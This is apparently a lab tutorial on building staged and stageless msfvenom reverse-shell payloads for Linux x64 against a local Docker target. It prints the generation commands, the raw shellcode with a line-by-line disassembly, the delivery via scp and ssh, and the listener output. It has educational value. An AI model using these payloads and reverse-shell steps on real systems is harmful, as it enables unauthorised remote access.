In this section, we will use `msfvenom` to create two payloads: a staged one, and a stageless one, and we will study the differences between them. We will use the Dockerfile in this folder to create a Linux machine on which we will be able to send the payload using SSH. Running it should let us getting a reverse shell.
## Stageless payload
The first step will be to choose the payload. The goal will be to get a reverse shell on a 64 bits Linux machine. We can get the list of the candidate payloads with this command:
```
$msfvenom -l payloads | grep linux | grep shell | grep reverse | grep x64
    cmd/linux/http/x64/shell/reverse_sctp                              Fetch and execute an x64 payload from an HTTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/http/x64/shell/reverse_tcp                               Fetch and execute an x64 payload from an HTTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/http/x64/shell_reverse_ipv6_tcp                          Fetch and execute an x64 payload from an HTTP server. Connect back to attacker and spawn a command shell over IPv6
    cmd/linux/http/x64/shell_reverse_tcp                               Fetch and execute an x64 payload from an HTTP server. Connect back to attacker and spawn a command shell
    cmd/linux/https/x64/shell/reverse_sctp                             Fetch and execute an x64 payload from an HTTPS server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/https/x64/shell/reverse_tcp                              Fetch and execute an x64 payload from an HTTPS server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/https/x64/shell_reverse_ipv6_tcp                         Fetch and execute an x64 payload from an HTTPS server. Connect back to attacker and spawn a command shell over IPv6
    cmd/linux/https/x64/shell_reverse_tcp                              Fetch and execute an x64 payload from an HTTPS server. Connect back to attacker and spawn a command shell
    cmd/linux/tftp/x64/shell/reverse_sctp                              Fetch and execute an x64 payload from a TFTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/tftp/x64/shell/reverse_tcp                               Fetch and execute an x64 payload from a TFTP server. Spawn a command shell (staged). Connect back to the attacker
    cmd/linux/tftp/x64/shell_reverse_ipv6_tcp                          Fetch and execute an x64 payload from a TFTP server. Connect back to attacker and spawn a command shell over IPv6
    cmd/linux/tftp/x64/shell_reverse_tcp                               Fetch and execute an x64 payload from a TFTP server. Connect back to attacker and spawn a command shell
    linux/x64/shell/reverse_sctp                                       Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell/reverse_tcp                                        Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_reverse_ipv6_tcp                                   Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                                        Connect back to attacker and spawn a command shell
```
We will use the payload `linux/x64/shell_reverse_tcp`.

It is now possible to generate the executable that will give us the reverse shell:
```
$msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf > reverse_shell
```
Here, `172.17.0.1` is the IP address of the docker interface of my machine.

The next step is to send the payload to the target machine. We will use docker to set up this machine:
```
docker build -t msfvenom_target $(pwd) && docker run -d msfvenom_target
```
Then, we can use `scp` to send the payload:
```
scp reverse_shell john@172.17.0.2:~/reverse_shell
```

Before running the payload, we should listen on the port 4444 on the attacker machine:
```
$nc -lnvp 4444
listening on [any] 4444 ...
```

We can now run the payload using the user `john`:
```
$ssh john@172.17.0.2
john@172.17.0.2's password: pass

$ ls -l
total 4
-rw-r--r-- 1 john john 194 May 12 07:23 reverse_shell
$ chmod +x reverse_shell
$ ./reverse_shell
```

We got the reverse shell:
```
$nc -lnvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58036
whoami
john
```
### Staged payload
We will now use the corresponding staged payload `linux/x64/shell/reverse_tcp`. If we reproduce exactly the same operations as with a stageless payload, we will get a segmentation fault when we will try to send our first command through the reverse shell. To understand what is happening, let's try to decompile the payload.
#### Stageless payload assembly
To get the shell code of the payload, we can generate it using the C format:
```
$msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f c > reverse_shell.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 338 bytes

$cat reverse_shell.c
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xac\x11\x00\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";
```
This code can be sent to a disassembler to get the corresponding assembly. I used [Defuse online disassembler](https://defuse.ca/online-x86-assembler.htm). I got the following code:
```
0:  6a 29                   push   0x29
2:  58                      pop    rax
3:  99                      cdq
4:  6a 02                   push   0x2
6:  5f                      pop    rdi
7:  6a 01                   push   0x1
9:  5e                      pop    rsi
a:  0f 05                   syscall
c:  48 97                   xchg   rdi,rax
e:  48 b9 02 00 11 5c ac    movabs rcx,0x10011ac5c110002
15: 11 00 01
18: 51                      push   rcx
19: 48 89 e6                mov    rsi,rsp
1c: 6a 10                   push   0x10
1e: 5a                      pop    rdx
1f: 6a 2a                   push   0x2a
21: 58                      pop    rax
22: 0f 05                   syscall
24: 6a 03                   push   0x3
26: 5e                      pop    rsi
27: 48 ff ce                dec    rsi
2a: 6a 21                   push   0x21
2c: 58                      pop    rax
2d: 0f 05                   syscall
2f: 75 f6                   jne    0x27
31: 6a 3b                   push   0x3b
33: 58                      pop    rax
34: 99                      cdq
35: 48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
3c: 73 68 00
3f: 53                      push   rbx
40: 48 89 e7                mov    rdi,rsp
43: 52                      push   rdx
44: 57                      push   rdi
45: 48 89 e6                mov    rsi,rsp
48: 0f 05                   syscall 
```

Let's decompose it:
```
0:  6a 29                   push   0x29
2:  58                      pop    rax
3:  99                      cdq
4:  6a 02                   push   0x2
6:  5f                      pop    rdi
7:  6a 01                   push   0x1
9:  5e                      pop    rsi
a:  0f 05                   syscall
```
This corresponds to `int fd = socket(AF_INET, SOCK_STREAM, 0)` which creates an IPv4 TCP socket.

```
c:  48 97                   xchg   rdi,rax
e:  48 b9 02 00 11 5c ac    movabs rcx,0x10011ac5c110002
15: 11 00 01
18: 51                      push   rcx
19: 48 89 e6                mov    rsi,rsp
1c: 6a 10                   push   0x10
1e: 5a                      pop    rdx
1f: 6a 2a                   push   0x2a
21: 58                      pop    rax
22: 0f 05                   syscall
```
This initiates the connection: `connect(fd, &sock_addr, sizeof(sock_addr))`. `sock_addr` address family is set to `AF_INET` the port is set to `4444`, and the IP address is set to `172.17.0.1`.

```
24: 6a 03                   push   0x3
26: 5e                      pop    rsi
27: 48 ff ce                dec    rsi
2a: 6a 21                   push   0x21
2c: 58                      pop    rax
2d: 0f 05                   syscall
2f: 75 f6                   jne    0x27
```
This sets the standard input, standard output and standard error to the file descriptor of the socket. In other words, everything will go through the socket.

```
31: 6a 3b                   push   0x3b
33: 58                      pop    rax
34: 99                      cdq
35: 48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
3c: 73 68 00
3f: 53                      push   rbx
40: 48 89 e7                mov    rdi,rsp
43: 52                      push   rdx
44: 57                      push   rdi
45: 48 89 e6                mov    rsi,rsp
48: 0f 05                   syscall 
```
This executes `/bin/sh`. As `stdout` or `stderr` have been redirected to the socket, the target IP address receives the shell and can interact with the system.
#### Staged payload assembly
Let's do the same with the staged payload:
```
$msfvenom -p linux/x64/shell/reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f c > staged_reverse_shell.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of c file: 574 bytes

$cat staged_reverse_shell.c
unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x11\x5c\xac\x11\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x26\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";
```

This corresponds to the following assembly code:
```
0:  31 ff                   xor    edi,edi
2:  6a 09                   push   0x9
4:  58                      pop    rax
5:  99                      cdq
6:  b6 10                   mov    dh,0x10
8:  48 89 d6                mov    rsi,rdx
b:  4d 31 c9                xor    r9,r9
e:  6a 22                   push   0x22
10: 41 5a                   pop    r10
12: 6a 07                   push   0x7
14: 5a                      pop    rdx
15: 0f 05                   syscall
17: 48 85 c0                test   rax,rax
1a: 78 51                   js     0x6d
1c: 6a 0a                   push   0xa
1e: 41 59                   pop    r9
20: 50                      push   rax
21: 6a 29                   push   0x29
23: 58                      pop    rax
24: 99                      cdq
25: 6a 02                   push   0x2
27: 5f                      pop    rdi
28: 6a 01                   push   0x1
2a: 5e                      pop    rsi
2b: 0f 05                   syscall
2d: 48 85 c0                test   rax,rax
30: 78 3b                   js     0x6d
32: 48 97                   xchg   rdi,rax
34: 48 b9 02 00 11 5c ac    movabs rcx,0x10011ac5c110002
3b: 11 00 01
3e: 51                      push   rcx
3f: 48 89 e6                mov    rsi,rsp
42: 6a 10                   push   0x10
44: 5a                      pop    rdx
45: 6a 2a                   push   0x2a
47: 58                      pop    rax
48: 0f 05                   syscall
4a: 59                      pop    rcx
4b: 48 85 c0                test   rax,rax
4e: 79 25                   jns    0x75
50: 49 ff c9                dec    r9
53: 74 18                   je     0x6d
55: 57                      push   rdi
56: 6a 23                   push   0x23
58: 58                      pop    rax
59: 6a 00                   push   0x0
5b: 6a 05                   push   0x5
5d: 48 89 e7                mov    rdi,rsp
60: 48 31 f6                xor    rsi,rsi
63: 0f 05                   syscall
65: 59                      pop    rcx
66: 59                      pop    rcx
67: 5f                      pop    rdi
68: 48 85 c0                test   rax,rax
6b: 79 c7                   jns    0x34
6d: 6a 3c                   push   0x3c
6f: 58                      pop    rax
70: 6a 01                   push   0x1
72: 5f                      pop    rdi
73: 0f 05                   syscall
75: 5e                      pop    rsi
76: 6a 26                   push   0x26
78: 5a                      pop    rdx
79: 0f 05                   syscall
7b: 48 85 c0                test   rax,rax
7e: 78 ed                   js     0x6d
80: ff e6                   jmp    rsi 
```

Let's decompose it:
```
0:  31 ff                   xor    edi,edi
2:  6a 09                   push   0x9
4:  58                      pop    rax
5:  99                      cdq
6:  b6 10                   mov    dh,0x10
8:  48 89 d6                mov    rsi,rdx
b:  4d 31 c9                xor    r9,r9
e:  6a 22                   push   0x22
10: 41 5a                   pop    r10
12: 6a 07                   push   0x7
14: 5a                      pop    rdx
15: 0f 05                   syscall
17: 48 85 c0                test   rax,rax
1a: 78 51                   js     0x6d
```
This calls `mmap` to create a new virtual address space. In case of error, it jumps to `0x6d`:
```
6d: 6a 3c                   push   0x3c
6f: 58                      pop    rax
70: 6a 01                   push   0x1
72: 5f                      pop    rdi
73: 0f 05                   syscall
```
It exits the process.

Let's go back to the case there is no error:
```
1c: 6a 0a                   push   0xa
1e: 41 59                   pop    r9
20: 50                      push   rax
21: 6a 29                   push   0x29
23: 58                      pop    rax
24: 99                      cdq
25: 6a 02                   push   0x2
27: 5f                      pop    rdi
28: 6a 01                   push   0x1
2a: 5e                      pop    rsi
2b: 0f 05                   syscall
2d: 48 85 c0                test   rax,rax
30: 78 3b                   js     0x6d
```
This creates the socket the same way as with the stageless payload.

```
32: 48 97                   xchg   rdi,rax
34: 48 b9 02 00 11 5c ac    movabs rcx,0x10011ac5c110002
3b: 11 00 01
3e: 51                      push   rcx
3f: 48 89 e6                mov    rsi,rsp
42: 6a 10                   push   0x10
44: 5a                      pop    rdx
45: 6a 2a                   push   0x2a
47: 58                      pop    rax
48: 0f 05                   syscall
4a: 59                      pop    rcx
4b: 48 85 c0                test   rax,rax
4e: 79 25                   jns    0x75
```
This initiates the connection to `172.17.0.2:4444`. In case of success, it jumps to `0x75`:
```
75: 5e                      pop    rsi
76: 6a 26                   push   0x26
78: 5a                      pop    rdx
79: 0f 05                   syscall
7b: 48 85 c0                test   rax,rax
7e: 78 ed                   js     0x6d
80: ff e6                   jmp    rsi 
```
It will start to read from the file descriptor of the socket to the buffer reserved by `mmap` before. If this is a success, it will execute the payload sent through from the attacker machine.

The rest of the code corresponds to a timeout:
```
50: 49 ff c9                dec    r9
53: 74 18                   je     0x6d
55: 57                      push   rdi
56: 6a 23                   push   0x23
58: 58                      pop    rax
59: 6a 00                   push   0x0
5b: 6a 05                   push   0x5
5d: 48 89 e7                mov    rdi,rsp
60: 48 31 f6                xor    rsi,rsi
63: 0f 05                   syscall
65: 59                      pop    rcx
66: 59                      pop    rcx
67: 5f                      pop    rdi
68: 48 85 c0                test   rax,rax
6b: 79 c7                   jns    0x34
```
We will try 10 times to do the connection, with a `nanosleep` between the different attempts. If we are still not able to connect, the program exits.

##### Send payload
To get the payload to send to the staged payload, I reused a part of the stageless payload:
```
0:  6a 03                   push   0x3
2:  5e                      pop    rsi
3:  48 ff ce                dec    rsi
6:  6a 21                   push   0x21
8:  58                      pop    rax
9:  0f 05                   syscall
b:  75 f6                   jne    0x3
d:  6a 3b                   push   0x3b
f:  58                      pop    rax
10: 99                      cdq
11: 48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
18: 73 68 00
1b: 53                      push   rbx
1c: 48 89 e7                mov    rdi,rsp
1f: 52                      push   rdx
20: 57                      push   rdi
21: 48 89 e6                mov    rsi,rsp
24: 0f 05                   syscall
```
This part of the payload redirects everything to the socket, and run `/bin/sh`. In hexadecimal, this payload is `\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05`. It is not a problem that this payload contains a NULL byte because the staged payload use `read` function to get the payload.

Using the C file `listner.c`, we can now send the payload and interact with the shell:
```
$gcc -o listner listner.c

$./listner 
Listening on port 4444...
```

In the terminal that will run Docker, run the following commands:
```
$docker build -t msfvenom_target $(pwd) && docker run -d msfvenom_target
$msfvenom -p linux/x64/shell/reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf > staged_reverse_shell
$scp staged_reverse_shell john@172.17.0.2:~/staged_reverse_shell
$ssh john@172.17.0.2

$ ./staged_reverse_shell
```

You can see that you get a reverse shell in the first console:
```
$./listner 
Listening on port 4444...
Connection established
Payload sent
id
uid=1000(john) gid=1000(john) groups=1000(john)
```

I tried to use `netcat` to send the payload and interact with the shell, but, I do not know why, the shell is correctly executed, but `netcat` do not want to send more data to the socket.